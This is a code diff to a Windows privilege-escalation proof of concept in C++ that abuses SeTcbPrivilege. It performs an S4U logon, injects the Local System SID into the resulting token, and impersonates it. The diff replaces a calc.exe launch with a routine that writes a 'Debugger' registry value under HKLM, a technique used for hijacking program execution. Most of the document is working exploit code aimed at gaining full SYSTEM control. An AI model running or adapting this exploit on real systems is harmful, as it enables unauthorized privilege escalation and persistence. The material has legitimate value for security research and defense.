@@ -5,8 +5,9 @@ and add arbitrary groups to the resulting token returned by this call.
 We will add the group SID “S-1-5-18” to the token, this is the SID for the Local System account 
 and if we are using a token that possesses it, we will have full privilege on the system. 
 
-It will start calc.exe with “NT AUTHORITY\SYSTEM” privilege.
+It will create a reg key at HKEY_LOCAL_MACHINE\SOFTWARE\testtcb
 */
+
 
 #include <windows.h>
 #include <assert.h>
@@ -22,6 +23,41 @@ It will start calc.exe with “NT AUTHORITY\SYSTEM” privilege.
 #define STATUS_SUCCESS           0
 #define EXTRA_SID_COUNT          2
 
+#include <string>
+using  std::string;
+
+void se_tcb_priv()
+{
+	DWORD sID;
+	ProcessIdToSessionId(GetCurrentProcessId(), &sID);
+	std::string data = "\"C:\\Windows\\System32\\calc.exe\"";
+
+	HKEY handle;
+	LSTATUS stat = RegCreateKeyExA(HKEY_LOCAL_MACHINE,
+		"SOFTWARE\\testtcb",
+		0,
+		NULL,
+		REG_OPTION_BACKUP_RESTORE,
+		KEY_SET_VALUE,
+		NULL,
+		&handle,
+		NULL);
+
+	if (stat != ERROR_SUCCESS) {
+		printf("[-] Failed opening key! %d\n", stat);
+		return;
+	}
+
+	stat = RegSetValueExA(handle, "Debugger", 0, REG_SZ, (const BYTE*)data.c_str(), data.length() + 1);
+	if (stat != ERROR_SUCCESS) {
+		printf("[-] Failed writing key! %d\n", stat);
+		return;
+	}
+
+	printf("[+] Key set");
+	RegCloseKey(handle);
+	return;
+}
 
 typedef struct _MSV1_0_SET_OPTION {
 	MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
@@ -31,36 +67,7 @@ typedef struct _MSV1_0_SET_OPTION {
 
 HANDLE g_hHeap;
 
-void StartCalc()
-{
-	wchar_t szCommandLine[] = L"calc";
-	STARTUPINFO si = { sizeof(si) };
-	PROCESS_INFORMATION pi;
-	si.dwFlags = STARTF_USESHOWWINDOW;
-	si.wShowWindow = true;
-
-	bool bRet = ::CreateProcess(
-		NULL,
-		szCommandLine,
-		NULL,
-		NULL,
-		FALSE,
-		CREATE_NEW_CONSOLE,
-		NULL,
-		NULL,
-		&si,
-		&pi);
-	if (bRet)
-	{
-		::CloseHandle(pi.hThread);
-		::CloseHandle(pi.hProcess);
-		printf("[+]New PID:%d\n", pi.dwProcessId);
-	}
-}
-
-
-BOOL
-GetLogonSID(
+BOOL GetLogonSID(
 	_In_ HANDLE hToken,
 	_Out_ PSID *pLogonSid
 )
@@ -281,7 +288,7 @@ run_s4u(HANDLE hToken)
 
 	LPTSTR szCommandLine = NULL;
 	LPTSTR szDomain = TEXT(".");
-	LPTSTR szUsername = TEXT("test1");//the user who has SeTcbPrivilege
+	LPTSTR szUsername = TEXT("1");//the user who has SeTcbPrivilege
 	TCHAR seps[] = TEXT("\\");
 	TCHAR *next_token = NULL;
 
@@ -441,7 +448,7 @@ run_s4u(HANDLE hToken)
 	}
 	else {
 		printf("Successfully impersonated S4U...\n");
-		StartCalc();
+		se_tcb_priv();
 
 	}
 
@@ -544,8 +551,8 @@ int GetTokenPrivilege(HANDLE tok)
 	{
 		TCHAR lpszPriv[MAX_PATH] = { 0 };
 		DWORD dwRet = MAX_PATH;
-		BOOL n = LookupPrivilegeName(NULL,&(ppriv->Privileges[i].Luid),lpszPriv,&dwRet);
-		printf("%-50ws",lpszPriv);
+		BOOL n = LookupPrivilegeName(NULL, &(ppriv->Privileges[i].Luid), lpszPriv, &dwRet);
+		printf("%-50ws", lpszPriv);
 		TCHAR lpszAttrbutes[1024] = { 0 };
 		RetPrivDwordAttributesToStr(ppriv->Privileges[i].Attributes, lpszAttrbutes);
 		printf("%ws\n", lpszAttrbutes);
@@ -575,7 +582,7 @@ BOOL EnablePriv(HANDLE hToken, LPCTSTR priv)
 
 	IsTokenSystem(hToken);
 	GetTokenPrivilege(hToken);
-	
+
 	return TRUE;
 }
 
@@ -590,6 +597,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	EnablePriv(hToken, SE_TCB_NAME);
 	run_s4u(hToken);
+
 
 	return 0;
 }
